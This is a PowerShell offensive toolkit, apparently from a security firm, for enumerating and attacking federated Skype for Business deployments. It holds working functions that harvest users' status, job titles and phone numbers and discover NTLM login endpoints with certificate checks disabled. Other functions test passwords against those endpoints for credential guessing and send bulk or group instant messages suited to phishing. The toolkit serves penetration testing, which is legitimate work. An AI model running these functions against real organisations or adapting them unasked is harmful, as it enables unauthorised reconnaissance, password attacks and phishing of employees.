<#
    File: PowerSkype.ps1
    Author: Karl Fosaaen (@kfosaaen), NetSPI - 2016
    Description: PowerShell functions for enumerating and attacking federated Skype for Business instances.
    Thanks: @nyxgeek for the http-ntlm authentication endpoints
#>

# To Do:
#       Add proper error handling on all inputs/functions
#       Add attachment functionality to send files w/messages


# Import the assembly into the PowerShell session - http://blog.powershell.no/2013/08/08/automating-microsoft-lync-using-windows-powershell/
if (-not (Get-Module -Name Microsoft.Lync.Model)) 
{
    try 
        {
            Import-Module -Name (Join-Path -Path ${env:ProgramFiles(x86)} -ChildPath "Microsoft Office 2013\LyncSDK\Assemblies\Desktop\Microsoft.Lync.Model.dll") -ErrorAction Stop
        }
    catch 
        {
            Write-Warning "Microsoft.Lync.Model not available, download and install the Lync 2013 SDK http://www.microsoft.com/en-us/download/details.aspx?id=36824"
            break
        }
}

Function Get-SkypeStatus{
<#
    .SYNOPSIS
        Gets the current status of valid federated Skype users.
    .PARAMETER email
        The email address to lookup.   
    .PARAMETER inputFile
        The file of email addresses to lookup. 
    .PARAMETER outputFile
        The CSV file to write the table to.
    .PARAMETER attempts
        The number of times to check the status (Default=1).          
    .PARAMETER delay
        The amount of delay to set between users read from a file.          		
    .EXAMPLE
        PS C:\> Get-SkypeStatus -email test@example.com 

		Email         : test@example.com
		Title         : Chief Example Officer
		Full Name     : Testing McTestface
		Status        : Available
		Out Of Office : False

#>


    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Email address to verify the status of.")]
        [string]$email,

        [Parameter(Mandatory=$false,
        HelpMessage="Input file to read email addresses from.")]
        [string]$inputFile,

        [Parameter(Mandatory=$false,
        HelpMessage="Output file to write valid emails to.")]
        [string]$outputFile,

        [Parameter(Mandatory=$false,
        HelpMessage="The number of times to check for an email's status - Default:1")]
        [string]$attempts,

        [Parameter(Mandatory=$false,
        HelpMessage="Delay to use - Helpful with large lists")]
        [string]$delay
    )

    # Connect to the local Skype process
    try
    {
        $client = [Microsoft.Lync.Model.LyncClient]::GetClient()
    }
    catch
    {
        Write-Host "`nYou need to have Skype open and signed in first"
        break
    }

    # Bounds check the important inputs
    if(($email.Length -eq 0) -and ($inputFile.Length -eq 0))
    {
        #Write-Host "Use -email or -inputFile and enter an email address..."
        Get-Help Get-SkypeStatus
        break
    }

    # Create data table to house results
    $TempTblUsers = New-Object System.Data.DataTable 
    $TempTblUsers.Columns.Add("Email") | Out-Null
    $TempTblUsers.Columns.Add("Title") | Out-Null
    $TempTblUsers.Columns.Add("Full Name") | Out-Null
    $TempTblUsers.Columns.Add("Status") | Out-Null
    $TempTblUsers.Columns.Add("Out Of Office") | Out-Null
    $TempTblUsers.Columns.Add("Endpoints") | Out-Null

    # Check if attempts is set
    if ($attempts.Length -eq 0){$attempts = 1}

    # Read any input file and kick off sub-routines
    if($inputFile)
        {
           foreach($line in (Get-Content $inputFile))
           {
            Get-SkypeStatus -email $line -attempts $attempts
            if ($delay -ne $null){sleep $delay}
           }
        }

    # Loop through the number of attempts
    for ($i=1; $i -le $attempts; $i++)
    {
        #Get a remote contact
        if ($email.Length -gt 0){
            try
            {
                $contact = $client.ContactManager.GetContactByUri($email)                
            }
            catch
            {
                Write-Host "`nFailed to lookup Contact"$email
                break
            }
        }
        else{break}

        # Create a conversation
        $convo = $client.ConversationManager.AddConversation()
        $convo.AddParticipant($contact) | Out-Null

        # Check contact availability
        if($contact.GetContactInformation('Availability') -gt '0')
        {
            $numbers = ""
            $phones = $contact.GetContactInformation('ContactEndpoints')
            $phones | foreach {if ($_.Uri -like "tel:*") {if ($_.Type -eq "WorkPhone"){$numbers += "Work: "+$_.Uri+" "} elseif ($_.Type -eq "MobilePhone"){$numbers += "Mobile: "+$_.Uri+" "}}}
            
            # Add user to the table
            $TempTblUsers.Rows.Add([string]$email,[string]$contact.GetContactInformation('Title'),[string]$contact.GetContactInformation('DisplayName'),$contact.GetContactInformation('Activity'),[string]$contact.GetContactInformation('IsOutOfOffice'),$numbers) | Out-Null

        }
        # End the conversation
        $convo.End() | Out-Null
        
        # If an output file is set, write the CSV
        if($outputFile)
        {
         $TempTblUsers | Export-Csv -Path $outputFile -Append
        }
    }
    return $TempTblUsers
}

Function Get-SkypeLoginURL{
<#
    .SYNOPSIS
        Attempts to identify Skype HTTP-NTLM login servers from the autodiscover server.
    .PARAMETER domain
        The domain name to lookup.   
    .EXAMPLE
        PS C:\> Get-SkypeLoginHost -domain example.com
		
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true,
        HelpMessage="The domain name to lookup.")]
        [string]$domain
    )

    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

    #Do Nyxgeek subdomain checks first

    $discoDomain = 'lyncdiscover.'+$domain
    $accessDomain = 'access.'+$domain
    $meetDomain = 'meet.'+$domain
    $dialinDomain = 'dialin.'+$domain

    try{($disco = Resolve-DnsName $discoDomain -ErrorAction Stop -Verbose:$false | select Name | Select-Object -First 1)|Out-Null}catch{}
    try{($access = Resolve-DnsName $accessDomain -ErrorAction Stop -Verbose:$false | select Name | Select-Object -First 1)|Out-Null}catch{}
    try{($meet = Resolve-DnsName $meetDomain -ErrorAction Stop -Verbose:$false | select Name | Select-Object -First 1)|Out-Null}catch{}
    try{($dialin = (Resolve-DnsName $dialinDomain -ErrorAction Stop -Verbose:$false | select Name | Select-Object -First 1))|Out-Null}catch{}


    if($disco.length -eq 0){Write-Verbose -Message "Lyncdiscover record not found"}
    else{
        $lyncURL = "https://lyncdiscover."+$domain
        $webclient = new-object System.Net.WebClient
        try{
            $webpage = $webclient.DownloadString($lyncURL)
            $FullLyncServer = "https://"+($webpage.Split('{')[3].Split('"')[3].Split("/")[2])+"/WebTicket/WebTicketService.svc/Auth"
            Write-Verbose -Message ("Lyncdiscover Authentication Endpoint Identified - "+$FullLyncServer)
            return $FullLyncServer
        }
        catch {Write-Verbose -Message "The AutoDiscover URL doesn't appear to work"}
    }
    
    if($dialin.length -eq 0){Write-Verbose -Message "Dialin record not found"}
    else{Write-Verbose -Message ("Dialin Authentication Endpoint Identified - https://dialin."+$domain+"/abs/"); return "https://dialin."+$domain+"/abs/"}
    

    #################STILL NEEDS SOME WORK#################
    if($meet.length -eq 0){Write-Verbose -Message "Meet record not found"}
    # Still Needs an auth endpoint here
    else{Write-Verbose -Message "Meet Authentication Endpoint Identified"; return "https://meet."+$domain+""}

    if($access.length -eq 0){Write-Verbose -Message "Access record not found"}
    # Still Needs an auth endpoint here
    else{Write-Verbose -Message "Access Authentication Endpoint Identified"; return "https://access."+$domain+""}
            
    Write-Host "`nThe domain does not appear to support any external Skype/Lync authentication endpoints" -ForegroundColor Red; break


    return $Returnurl
        
}

Function Invoke-SkypeLogin{
<#
    .SYNOPSIS
        Attempts a login as a Skype user.
    .PARAMETER email
        The email address to login as. 
    .PARAMETER username
        The username to login as.   
	.PARAMETER password
        The password to use.
	.PARAMETER url
        The url to authenticate against.
    .EXAMPLE
        PS C:\> Invoke-SkypeLogin -email test@example.com -password Fall2016 
		
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true,
        HelpMessage="Email address to login as.")]
        [string]$email,

        [Parameter(Mandatory=$false,
        HelpMessage="Username to login as.")]
        [string]$username,

        [Parameter(Mandatory=$true,
        HelpMessage="Password to use.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain name to login with.")]
        [string]$domain,

        [Parameter(Mandatory=$false,
        HelpMessage="The url to authenticate against.")]
        [string]$url
    )

    if ($domain.Length -eq 0){$domain = $email.Split("@")[1]}
    
    if($url.Length -eq 0){
        $emailDomain = $email.Split("@")[1]
        $url = Get-SkypeLoginURL -domain $emailDomain
    }

    if($url -like '*lync.com*'){Write-Host 'Microsoft Managed Skype for Business instance - HTTP NTLM Auth currently not supported' -ForegroundColor Red; break}

    if($username.Length -eq 0){$username = $email.Split("@")[0]}


    
    #Test URL - https://webdirca1.online.lync.com/WebTicket/WebTicketService.svc/Auth


    #https://meet.lync.com/TENNANT_NAME/USER/MEETING


    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

    #Depending on the HTTP code, determine if auth was successful
    #Useful info on the autodiscover protocol - http://www.lyncexch.co.uk/lyncdiscover-and-auto-discovery-deeper-dive/

    $req = [system.Net.WebRequest]::Create($url)
    $req.Credentials = new-object System.Net.NetworkCredential($username, $password, $domain)
    try {
        $res = $req.GetResponse()
        } catch [System.Net.WebException] {
        $res = $_.Exception.Response
        }
    if ([int]$res.StatusCode -eq '403'){Write-Host 'Authentication Successful: '$username' - '$password -ForegroundColor Green}
    else{Write-Host 'Authentication Failure: '$username' - '$password -ForegroundColor Red}

    #$webpage = $webclient.DownloadString($url)
      

    #Write-Host "Successful Authentication for:"$email" - "$password

}

Function Invoke-SendSkypeMessage{
<#
    .SYNOPSIS
        Sends messages to Skype users.
    .PARAMETER email
        The email address to send the message to.   
    .PARAMETER message
        The message to send.   
	.PARAMETER inputFile
        The file of email addresses to message. 
    .EXAMPLE
        PS C:\> Invoke-SendSkypeMessage -email test@example.com -message "Hello World" 
		Sent the following message to test@example.com:
		Hello World 
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Email address to send the message to.")]
        [string]$email,

        [Parameter(Mandatory=$true,
        HelpMessage="Message to send.")]
        [string]$message,

        [Parameter(Mandatory=$false,
        HelpMessage="File of email addresses to send the message to.")]
        [string]$inputFile
    )
    
    # Connect to the local Skype process
    try
    {
        $client = [Microsoft.Lync.Model.LyncClient]::GetClient()
    }
    catch
    {
        Write-Host "`nYou need to have Skype open and signed in first"
        break
    }

    # Bounds check the important inputs
    if(($email.Length -eq 0) -and ($inputFile.Length -eq 0))
    {
        #Write-Host "Use -email or -inputFile and enter an email address..."
        Get-Help Invoke-SendSkypeMessage
        break
    }

    # Read any input file and kick off sub-routines
    if($inputFile)
    {
        foreach($line in (Get-Content $inputFile))
        {
            if ($line.Length -ne $null){Invoke-SendSkypeMessage -email $line -message $message}
        }
        break
    }
        
    #Start Conversation 
    $msg = New-Object "System.Collections.Generic.Dictionary[Microsoft.Lync.Model.Conversation.InstantMessageContentType, String]"

    #Add the Message
    $msg.Add(1,$message)

    # Add the contact URI
    try 
    {
        $contact = $client.ContactManager.GetContactByUri($email) 
    }
    catch
    {
        Write-Host "`nFailed to lookup Contact"$email
        break
    }

    # Create a conversation
    $convo = $client.ConversationManager.AddConversation()
    $convo.AddParticipant($contact) | Out-Null

    # Set the message mode as IM
    $imModality = $convo.Modalities[1]
    # Send the message
    $imModality.BeginSendMessage($msg, $null, $imModality) | Out-Null
    # End the Convo to suppress the UI
    $convo.End() | Out-Null

    Write-Host "Sent the following message to "$email":`n"$message
}


Function Invoke-SendGroupSkypeMessage{
<#
    .SYNOPSIS
        Sends group messages to multiple Skype users.
    .PARAMETER emails
        The email addresses to send the message to.   
    .PARAMETER message
        The message to send.   
	.PARAMETER inputFile
        The file of email addresses to message. 
    .EXAMPLE
        PS C:\> Invoke-SendGroupSkypeMessage -emails "test@example.com, test1@example.com" -message "testing"
		Sent the following message to 2 users:
		testing 
	.EXAMPLE
		PS C:\> Invoke-SendGroupSkypeMessage -inputFile "C:\Temp\2Emails.txt" -message "testing"
		Sent the following message to 2 users:
		testing 
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Email addresses to send the message to.")]
        [string]$emails,

        [Parameter(Mandatory=$false,
        HelpMessage="Input file to read email addresses from.")]
        [string]$inputFile,

        [Parameter(Mandatory=$true,
        HelpMessage="Message to send.")]
        [string]$message
    )

    # Variable checking
    if (($emails -eq $null) -and ($inputFile -eq $null)){break}
    
    # Connect to the local Skype process
    try
    {
        $client = [Microsoft.Lync.Model.LyncClient]::GetClient()
    }
    catch
    {
        Write-Host "`nYou need to have Skype open and signed in first"
        break
    }
        
    #Start Conversation 
    $msg = New-Object "System.Collections.Generic.Dictionary[Microsoft.Lync.Model.Conversation.InstantMessageContentType, String]"

    #Add the Message
    $msg.Add(1,$message)

    # Get a count of the emails for final output 
    $count = 0

    if($inputFile)
    {
        # Create a conversation
        $convo = $client.ConversationManager.AddConversation()
        foreach($email in (Get-Content $inputFile))
        {
            # Add email to group message $line
            try 
            {
                $contact = $client.ContactManager.GetContactByUri($email.Replace(" ",""))
                $convo.AddParticipant($contact) | Out-Null
                $count += 1
            }
            catch
            {
                Write-Host "`nFailed to lookup Contact"$email
            }            
        }
    }
    else
    {
        # Create a conversation
        $convo = $client.ConversationManager.AddConversation()
        # add the comma list from the input to the message
        $emailSplit = $emails.Split(',')
        foreach ($email in $emailSplit)
        {
            try 
            {
                $contact = $client.ContactManager.GetContactByUri($email.Replace(" ",""))
                $convo.AddParticipant($contact) | Out-Null
                $count += 1
            }
            catch
            {
                Write-Host "`nFailed to lookup Contact"$email
            }
            
        }        
     }

    # Set the message mode as IM
    $imModality = $convo.Modalities[1]
    # Send the message
    $imModality.BeginSendMessage($msg, $null, $imModality) | Out-Null
    # Uncomment the next line to end the Convo to suppress the UI
    # $convo.End() | Out-Null

    Write-Host "Sent the following message to"$count "users:`n"$message
}


Function Get-SkypeFederation{
<#
    .SYNOPSIS
        Does DNS lookups on common federation records.
    .PARAMETER Domain
        The domain to lookup.   
	.EXAMPLE
		PS C:\> Get-SkypeFederation -domain netspi.com

		Domain                 : netspi.com
		MS=MS*                 : True
		_sip._tcp              : False
		_sip._tls              : True
		_sipfederationtls._tcp : False
#>

    # This is in Progress...

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain to verify the status of.")]
        [string]$domain
    )

    # Create data table to house results
    $TempTblDomain = New-Object System.Data.DataTable 
    $TempTblDomain.Columns.Add("Domain") | Out-Null
    $TempTblDomain.Columns.Add("MS=MS*") | Out-Null
    $TempTblDomain.Columns.Add("_sip._tcp") | Out-Null
    $TempTblDomain.Columns.Add("_sip._tls") | Out-Null
    $TempTblDomain.Columns.Add("_sipfederationtls._tcp") | Out-Null

    $txt = try{(Resolve-DnsName -Type TXT $domain -ErrorAction Stop | select Strings)}catch{}
    $sip = try{Resolve-DnsName -Type SRV "_sip._tcp.$domain" -ErrorAction Stop}catch{}
    $siptls = try{Resolve-DnsName -Type SRV "_sip._tls.$domain" -ErrorAction Stop}catch{}
    $sipFed = try{Resolve-DnsName -Type SRV "_sipfederationtls._tcp.$domain" -ErrorAction Stop}catch{}

    $ms = "False"
    $sipTrue = "False"
    $siptlsTrue = "False"
    $sipFedTrue = "False"

    if($txt -contains "MS=" -or "ms=")
    {
        $ms = "True"
    }
    if($sip)
    {
        $sipTrue = "True"
    }
    if($siptls)
    {
        $siptlsTrue = "True"
    }
    if($sipFed)
    {
        $sipFedTrue = "True"
    }

    # Add domain to table
    $TempTblDomain.Rows.Add([string]$domain,[string]$ms,[string]$sipTrue,[string]$siptlsTrue,[string]$sipFedTrue) | Out-Null
    return $TempTblDomain   
}


function Get-SkypeContacts{

<#
    .SYNOPSIS
        Gets a list of contacts from the current user.
	.PARAMETER group
        The specific group to list. (Default is to list all contacts)
    .EXAMPLE
        PS C:\> Get-SkypeContacts | ft -AutoSize
        Email             Title              Full Name     Status    Out Of Office  Endpoints                                                                                   
        -----             -----              ---------     ------    -------------  ---------                                                                                   
        test@example.com  Person of Interest J Doe         Offline   False          Work: tel:911
		
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="The contact group to list.")]
        [string]$group
    )

    # Connect to the local Skype process
    try
    {
        $client = [Microsoft.Lync.Model.LyncClient]::GetClient()
    }
    catch
    {
        Write-Host "`nYou need to have Skype open and signed in first"
        break
    }

    if ($group.length -ne 0){
            $groups = $client.ContactManager.Groups
            foreach ($g in $groups){
                if ($g.Name -eq $group) {
                    foreach ($contact in $g){
                        foreach ($email in $contact.GetContactInformation('email')){Get-SkypeStatus $email}
                    }
                }
            }
    }
    else{
        $groups = $client.ContactManager.Groups
        foreach ($g in $groups){ 
            foreach ($contact in $g){
                foreach ($email in $contact.GetContactInformation('email')){Get-SkypeStatus $email}
            }
        }
    }
}
